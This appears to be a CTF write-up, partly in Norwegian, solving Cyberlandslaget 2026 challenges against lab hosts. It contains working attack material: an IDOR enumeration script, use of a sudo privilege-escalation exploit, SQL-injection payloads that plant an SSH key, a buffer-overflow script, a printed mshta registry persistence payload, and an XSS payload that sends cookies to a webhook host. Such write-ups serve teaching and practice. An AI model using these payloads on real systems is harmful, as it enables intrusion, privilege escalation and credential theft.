# Cyberlandslaget 2026

# BOOT2ROOT

## Kopi Pasta

My first thought was to look for an IDOR vulnerability, but it I got unauthorized for all IDs below 30. Therefore I dug deeper looking at the network traffic. Then I found an API endpoint, `http://kopipasta.cfire/api/v1/`:

```json
{
  "endpoints": [
    {
      "description": "Get all paste IDs",
      "method": "GET",
      "path": "/api/v1/pastes"
    },
    {
      "description": "Get a specific paste by ID",
      "method": "GET",
      "path": "/api/v1/pastes/:id"
    },
    // ...
  ]
}
```

I realized that the `/api/v1/pastes/:id` endpoint did not require authentication, even when I tried to access other users' pastes. Therefore I wrote a simple script to enumerate all avaivlable paste IDs:

```py
import requests

base_url = "http://kopipasta.cfire/api/v1/pastes/{}"

for x in range(1, 31):
    url = base_url.format(x)
    try:
        response = requests.get(url, timeout=10)
        print(f"ID {x} | Status: {response.status_code}")
        print(response.text)
        print("-" * 60)
    except requests.RequestException as e:
        print(f"ID {x} | Error: {e}")
```

One of the pastes contained SSH credentials, which I used to log in to the server:

Revealse credentials: `samedit:what_in_the_67`


```bash
ssh samedit@kopipasta.cfire
```

The username `samedit` hints to the vulnerability Baron Samedit (CVE-2021-3156), which is a vulnerability in sudo that allows for privilege escalation. A quick check also proves that the sudo version is indeed vulnerable. I tried 3 PoC's for this vulnerability, but only one of them worked: https://github.com/worawit/CVE-2021-3156.

I had to remove ip capabilities from the script to prevent it from crashing, since the tool was not accessible.

```bash
samedit@e30ba30ac0e8:~/CVE-2021-3156$ python3 exploit_nss.py
root@e30ba30ac0e8:/# cat ~/flag.txt
```

`DDC{bruh_i_p4s73d_4_bi7_700_much}`



# Squeaky Clean 1

A Flask web app exposed two vulnerabilities: an **LFI** in the dashboard route and a **SQLi** via `cursor.executescript()` in the login route. Chaining them allows writing an SSH public key via `VACUUM INTO`, leading to a shell.


## Recon via LFI

These is an LFI in the dashboard route, which can be used to read any file on the system, including the app source code:

```
/dashboard?file=../../../../home/user/app/app.py
```

- App uses `cursor.executescript(f"SELECT * FROM users WHERE username='{username}' AND password='{password}';")` with stacked queries and no sanitization.
- `/home/user/.ssh/` is writable by `user`

```
/dashboard?file=../../../../home/user/.ssh/authorized_keys"
```


## Generate SSH Keypair

```bash
# Generate SSH keypair
ssh-keygen -t ed25519 -f ctf_id_ed25519 -N "" -C "pwn@ctf" 2>/dev/null

# SQL Injection #1: Insert public key
curl -s -X POST http://squeaky-clean.cfire \
  --data-urlencode "username=x'; DELETE FROM users WHERE id=3; INSERT INTO users(id,username,password) VALUES(3, char(10)||char(10)||char(10)||char(10)||char(10)||'$(cat ctf_id_ed25519.pub)'||char(10),'x'); --"
# SQL Injection #2: Copy database to authorized_keys2
curl -s -X POST http://squeaky-clean.cfire \
  --data-urlencode "username=x'; VACUUM INTO '/home/user/.ssh/authorized_keys2'; --"

# SSH login
echo "ssh -i ctf_id_ed25519 user@squeaky-clean.cfire"
```

Both requests return `SQL Error: near "AND": syntax error` — that is expected and means the payloads ran successfully.


## Read the Flag

```bash
ssh -i /tmp/ctf_id_ed25519 -o StrictHostKeyChecking=no user@10.42.6.190
./flag.bin
```

`DDC{Sql1te_To_Auth0riz3d?!}`




# CRYPTO

## Wifi Heist

Reverserer scrambling:

```py
def reverse_it_guy_scramble(scrambled):
    # Step 3: undo XOR with 42
    step3_undo = [num ^ 42 for num in scrambled]

    # Step 2: undo reversal
    step2_undo = step3_undo[::-1]

    # Step 1: undo shift of +3
    password = "".join([chr(num - 3) for num in step2_undo])

    return password

# Example usage with the scrambled password:
scrambled_password = [
    170, 28, 77, 25, 76, 72, 28, 65, 93, 72, 77,
    28, 68, 76, 29, 95, 76, 72, 82, 25, 86, 84,
    108, 109, 109,
]

original_password = reverse_it_guy_scramble(scrambled_password)
print("Recovered password / flag:", original_password)
```

`DDC{y0u_cr4ck3d_th3_c0d3}`




# FORENSICS

## Persistance is key

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    System32    REG_SZ    mshta.exe "javascript:var s1="HKCU\\";var s2="Software\\";var gfd="1";var s3="Microsoft\\";var s4="Windows\\";var s5="Shell\\";var s6="Bags\\";var s7=gfd+"\\";var s8="Desktop\\";var s9="Profile"+gfd;var a4fh4r = eval;xo6=new%20ActiveXObject("WScript.Shell");A8nnnngfg=xo6.RegRead(s1+s2+s3+s4+s5+s6+s7+s8+s9);a4fh4r(A8nnnngfg);close();"
```

```js
xo6 = new ActiveXObject("WScript.Shell");
A8nnnngfg = xo6.RegRead("HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop\\Profile1");
eval(A8nnnngfg)
```

![alt text](images/forensics/percistance is key/image.png)

```js
new ActiveXObject("WScript.Shell").Run("%APPDATA%\\discord\\update.exe",0,false)
```

På bildet ser vi også et register som inneholder et passord:

`xSbRFPNuKpLeguYhiCAFcddbchSQMY`

Jeg laster ned og undersøker `update.exe`.

Den inneholder kode som genererer tilfeldige filer på skrivebordet, og kjører shellcode som åpner `calc.exe`. Claude mente at dette bare var implementert som en spøk, og for å skryte av at de hadde skjult shell.

Derimot avslører `binwalk` at det er annet innhold i fila enn bare executable-koden:

```bash
binwalk update.exe
```

Forenkla output:

```DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Microsoft executable, portable (PE)
692193        0xA8FE1         bix header, header size: 64 bytes, OS: FreeBSD, image name: ""
2833628       0x2B3CDC        Zip archive data, name: flag.png
2945878       0x2CF356        End of Zip archive, footer length: 22
```

Jeg klarte ikke å eksportere zippen med `binwalk`, men dette pythonscriptet gjør jobben:

```py
import zipfile, io

with open("update.exe", "rb") as f:
    data = f.read()

# ZIP starts at offset 0x2B3CDC
zip_data = data[0x2B3CDC:]

with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
    z.extractall(".", pwd=b"xSbRFPNuKpLeguYhiCAFcddbchSQMY")
```

Den åpner zippen og gir oss `flag.txt`:

![alt text](images/forensics/percistance is key/flag.png)

`DDC{M4gnific3nt-M4lwar3-R3mov4l}`




# PWN

## Fear of Long Words

Simple buffer overflow. Return to win().

```py
from pwn import *


def main() -> None:
    context.binary = ELF("./ordbog", checksec=False)
    offset = 80
    payload = b"A" * offset + p32(context.binary.symbols["win"])

    io = process("./ordbog")
    # nc fear-of-long-words.cfire 1337
    io = remote("fear-of-long-words.cfire", 1337)
    io.sendlineafter(b"> ", b"add " + str(len(payload)).encode())
    io.sendafter(b"Enter word:\n", payload)
    io.interactive()


if __name__ == "__main__":
    main()
```



# REV

# Mitosis

Cluet her er at operasjonene som blir gjort på input-strengen er reversjerbar. Hver komponent i funksjonen gjør operasjoner som:

P = P^-1

Det fører til at hele funksjonen T også er sin egen invers:

T^-1 = T

Verdien som sammenliknes kan gjøres på flere måter, som gdb, statisk analyse eller som Claude valgte å gjøre: dumpe med et LD_PRELOAD-bibliotek som erstatter memcmp med en versjon som også dumper output:

```py
import subprocess

# 1. Read the expected result from transform
with open("mitosis", "rb") as f:
    f.seek(0x1D018) # Offset of compared data
    expected = f.read(50) # Read flag length

print("[*] Expected bytes:", expected.hex())

# 2. Write LD_PRELOAD hook for memcmp
with open("helper.c", "w") as f:
    f.write("""#include <stdio.h>
int memcmp(const void *s1, const void *s2, size_t n) {
    puts((char*)s1);
}
""")
subprocess.run(["gcc", "-shared", "-o", "helper", "helper.c"])

# 3. Run binary with LD_PRELOAD and send expected bytes
subprocess.run("./mitosis", input=expected + b"\n", env={"LD_PRELOAD": "./helper"})
```

Flagget er:

`DDC{travel_through_c3llul4r_aut0mata_space_time!!}`



## Reactor

### Summary

The binary runs a custom VM inside the kernel via eBPF, hooked onto `clock_nanosleep` ticks. The VM reads a password over MMIO, encodes each character with a rolling XOR, and compares against expected values embedded in `.rodata`.

Encoding: `((char + 0x30) & 0xFF) ^ ((index×8 − 0x30) & 0xFF)`

### Solve

The 23 expected values are at file offset `0x199EC0 + 253×2`. Invert the transform:

```python
import struct

# Get the password data from the binary
data = open('./reactor','rb').read()[0x199ec0 : 0x199ec0 + 308*2]
w = struct.unpack_from('<308H', data)

# Decrypt the password
# ROM[0xfc] = w[252] = num chars; encoded values at w[253..275]
print(''.join(
    chr((( w[253+i] ^ (((i*8)-0x30)&0xFF) ) - 0x30) & 0xFF)
    for i in range(w[252])
))
```

`DDC{iT_runz_1n_da_c0r3}`




# WEB

## Report Error

Det er åpenbart at målet med oppgaven er å få botten som har flagget i en cookie til å sende oss flagget gjennom reflected XSS.

Problemet er at den kjente angrepsvektoren for XSS i `reportError` er blitt blacklistet:

```js
params = new URLSearchParams(location.search)
from = params.get('from')
to = params.get('to')

if (from != 'reportError' && to != 'eval'){
    window[from] = window[to]
    error = params.get('error')
    reportError(`[${error}] is XSS if you include a seahorse emoji in the url!`)
}
```


### Løsning

Jeg forstår at målet er å gjøre noe likende, så jeg ønsker å finne mulige variasjoner av `reportError` og `eval`:

ReportError trigger et error event som kan fanges opp av `onerror` event-handler, og `eval` kan erstattes med enten `setTimeout`:

```js
from=onerror
to=setTimeout
```

Problemet med `onerror` er at den ikke argumentet fra `reportError`. Derimot plukker den kun opp en string av feilmeldingen:

```js
Uncaught [<error>] is XSS if ...
```

Den siste delen er lett å fjerne med en kommentar, `alert(1)] //`. Men `setTimeout` vil fortsatt lese `Uncaught` som en del av koden som skal kjøres. For at koden ikke skal krasje kan jeg deferere Uncaught slik at det blir en gyldig funksjon:

```js
alert(1)]; function Uncaught(){} //
```

Error payload blir dermed:

```js
error=alert(1)];function Uncaught()(){} //
```

Hele payloaden med url encoding (pass på at `+` må være `%2B`) blir dermed:

```js
from=onerror&
to=setTimeout&
error=fetch("//webhook.site/875dfaf2-6df1-46a2-a98f-6947b85638b3?"%2Bdocument.cookie)%5D;function%20Uncaught()%7B%7D//
```

Flagget blir sendt til webhooken når botten besøker urlen:

`DDC{W0W_y0u_5ur3_r3p0rt3d_4n_3rr0r_1387ysdlkj12}`



